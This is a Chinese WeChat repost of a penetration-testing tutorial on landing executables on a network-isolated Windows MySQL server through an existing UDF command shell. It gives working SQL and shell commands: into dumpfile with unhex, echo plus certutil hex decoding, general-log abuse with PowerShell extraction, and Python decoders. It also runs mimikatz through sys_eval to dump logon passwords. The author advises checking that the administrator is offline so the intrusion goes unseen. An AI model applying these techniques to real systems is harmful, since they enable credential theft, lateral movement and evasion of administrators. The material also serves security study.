#  MySQL站库分离不出网落地Exe方式探究

海鸥i  [ 黑白之道 ](javascript:void\(0\);)

**黑白之道** ![]()

微信号 i77169

功能介绍 我们是网络世界的启明星，安全之路的垫脚石。

____

__

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20220422103649.png)

文章来源：先知社区（海鸥i）

原文地址：https://xz.aliyun.com/t/10960

  

 **0x01 前言**

之前偶尔会遇到站库分离数据库不出网&没有Webshell的情况，只有一个可以执行命令的shell，这种情况下如果想进行横向只能通过数据库来落地我们的工具。  

  

 **注：** 文中只是为了演示数据库如何落地exe，可能部分环境过于理想化，在实战中很难遇到。

  

 **0x02 模拟环境**

 **模拟环境：** Windows+Mysql 5.7.26，web目录没有写入权限，但是对lib/plugin有写入权限，可以使用UDF执行命令。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103709.png)

  

 **0x03 into dumpfile**

 **1.1.1 导出exe**  

复制exe文件的16进制，然后执行。

  * 

    
    
    select unhex("exe文件的16进制") into dumpfile "\\路径\\文件名.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220422103710.png)

  

导出后的文件可以正常执行

![](https://gitee.com/fuli009/images/raw/master/public/20220422103711.png)

  

####  **1.1.2 执行**

这里落地了一个mimikat.exe，然后执行

  * 

    
    
    select sys_eval('C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\M.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\res1.txt"')

![](https://gitee.com/fuli009/images/raw/master/public/20220422103712.png)

  

执行完毕后可以使用windows的more、type或者mysql的Load_file函数查看执行结果

![](https://gitee.com/fuli009/images/raw/master/public/20220422103715.png)  

####  **1.1.3 exe退出**

如果运行了一个exe程序，但是没有给他退出的命令或者是他自己不会终止退出。例如我直接运行mimikatz.exe没有给参数传入，那么他会在目标服务器直接弹一个黑窗，一直卡在这，直到程序被终结。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103716.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220422103721.png)

  

这种情况可以在桌面手动关闭,也可以通过shell关闭。

  * 

    
    
    select sys_eval('tasklist /svc |findstr "进程名.exe"')

![]()

  

将结果进行16解码即可得到进程id,再Kill掉就好了。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103722.png)

  

####  **1.1.4 注意点**

导出的文件，不能是已经存在的文件，否则会报错。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103724.png)

  

导出路径中的"\"为两个，否则会转义。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103725.png)

  

使用findstr查找进程的时候,要使用双引号包裹进程名。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103726.png)  

正常执行程序的时候，会秒弹一个黑窗然后退出，使用暂时没找到解决办法。尽量避免管理员在线的时候执行exe，使用query user可查看管理员是否在线。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103730.png)

  

 **0x04 into outfile**

into outfile会转义换行符，导致exe无法正常执行。  

![]()

  
正常exe![](https://gitee.com/fuli009/images/raw/master/public/20220422103731.png)  
导出的exe

![](https://gitee.com/fuli009/images/raw/master/public/20220422103732.png)

  
在大小上也可以明显看出,导出的比正常的要大很多。

![]()

  

 **0x05  echo导出**

 **1.3.1 全部写入**  

既然可以执行命令，那么可以使用echo将exe-16进制写入&追加到一个文件，然后再使用certutil解码还原。

  * 

    
    
    select sys_eval("echo exe_hex >> c:\\users\\admin\\desktop\aaa.txt && certutil -decodehex c:\\users\\admin\\desktop\aaa.txt c:\\users\\admin\\desktop\aaa.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220422103733.png)  
将16进制全部复制执行报错了，但是echo 123可以正常写入，可能是长度问题？  

####  **1.3.2 Windows命令行限制**

百度了一下windows命令行最大长度为8191，16进制长度是113898，做了一个小实验来验证百度到的答案：

  

复制所有16进制到cmd，echo 所有16进制>> 11.txt。因为有长度限制，只会复制一部分到cmd。查看cmd中最后的exe-hex
08B45F4890424E85D在全部exe-hex中的位置-8176，加上echo空格>>空格11.txt刚好8190个字节。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103734.png)  

####  **1.3.3 分段追加写入**

直接全部写入会超出命令行限制，只能去分段写入。使用echo每追加一次都会自动换行，在百度找到了使用set /p=""这种方式可以实现不换行追加。  

![](https://gitee.com/fuli009/images/raw/master/public/20220422103735.png)

  
这个是个体力活，在本地就不手动了追加了，写个脚本假装手工追加写入。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103736.png)

  
将导入的16进制文件解码即可得到可执行文件

![](https://gitee.com/fuli009/images/raw/master/public/20220422103737.png)

  

####  **1.3.4 遇到的问题**

使用set /p分段追加无论是手动还是脚本都会遇到一个问题。执行完他已经写入，但不会自己终止结束这条命令并换行，需要手动不断回车来结束。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103738.png)

  

 **0x06  日志**

 **常见Getshell日志类型**  

常用的日志导出有通用日志、慢日志查询，经过测试他们在操作方面没太大差距，这里只使用通用日志来实验。  

####  **1.3.1 通用日志**

通用日志是最常用的一种日志Getshell的方式，会记录我们执行的查询语句。

  *   *   *   * 

    
    
    show variables like 'general_log';  #查看日志是否开启set global general_log=on;      #开启日志功能show variables like 'general_log_file'; #看看日志文件保存位置set global general_log_file='log_path'; #设置日志文件保存位置

  
设置日志路径，然后开启日志，执行select "exe-hex"，再使用正则匹配出exe-hex进行解码即可。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103740.png)

  
使用powershell匹配出exe-hex

  * 

    
    
    powershell -c "&{$b=[System.IO.File]::ReadAllBytes('日志文件');set-content -value $b[开始位置..结束位置] -encoding byte -path '保存路径';}"

  

使用[System.IO.File]::ReadAllBytes读取日志全部内容，再使用set-content筛选出我们的exe-hex。

  
在shell中可以使用type来读取日志文件，复制到本地查看exe-
hex在日志中的位置，我在phpmyadmin测试使用udf去执行type只读取到了118134个字节，不过刚好读取完我们的exe-hex。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103741.png)

  

####  **1.3.2 注意点**

1\. 这里尽量先设置好日志存储路径再开启日志记录，日志会少一点。

  

2\. 在执行完select "exe-hex"之后要关闭日志记录，否则powershell无法打开。

![](https://gitee.com/fuli009/images/raw/master/public/20220422103742.png)

  

3\. powershell导出exe-hex的时候会覆盖源文件

  

 **0x07  思考**

 **以下几个点是在实验过程中 &偶然灵光一现感觉可行的思路  
**

  

大都是使用certuil解码？有没有其他的解码方式?（已解决）

  

没找到其他windows自带的程序可以解码，之后想到可以python解码，由此想到其他支持在命令行执行单行代码的语言php、perl等。其他的不支持在命令行执行代码的语言，可以再使用上面的方法导出该语言对应的解码代码，再去调用执行进行解码。

  

下面是python3的一句话hex解码，其他语言也大致类似思路，这里就不演示啦。

  * 

    
    
    python -c "import binascii;text=open('res.exe','ab');text.write(binascii.a2b_hex(open('exe-hex.txt').read()))"

![](https://gitee.com/fuli009/images/raw/master/public/20220422103743.png)  

outfile既然导出二进制会增加转义、换行，如果可以使用powershell、编程语言将其再过滤，是不是也可以用。（未解决）

  

最后日志使用powershell可以获取到exe-hex，如果没有powershell感觉使用编程语言也可以匹配出来。（已解决）

  * 

    
    
    python -c "import re;import binascii;z=re.findall('(4D5A.*?6500)\"',open('log.log').read());text=open('res1.exe','ab');text.write(binascii.a2b_hex(z[0]))"

![](https://gitee.com/fuli009/images/raw/master/public/20220422103744.png)  

感觉echo导出方式这个也适用于不出网对web目录没写入权限的命令执行。

  

 **0x08  总结**

![](https://gitee.com/fuli009/images/raw/master/public/20220422103745.png)

  

 **0x09  参考链接**

Mysql日志介绍-通用日志

https://blog.csdn.net/leshami/article/details/39779225

Mysql通用日志Getshell

https://www.cnblogs.com/KHZ521/p/14961303.html

Windows命令行长度限制

https://blog.csdn.net/u011250186/article/details/108409562

python十六进制转换为字符串

https://blog.csdn.net/weixin_39914107/article/details/111429294

  

如侵权请私聊公众号删文

![](https://gitee.com/fuli009/images/raw/master/public/20220422103746.png)

多一个点在看![](https://gitee.com/fuli009/images/raw/master/public/20220422103747.png)多一条小鱼干

  

预览时标签不可点

收录于合集 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

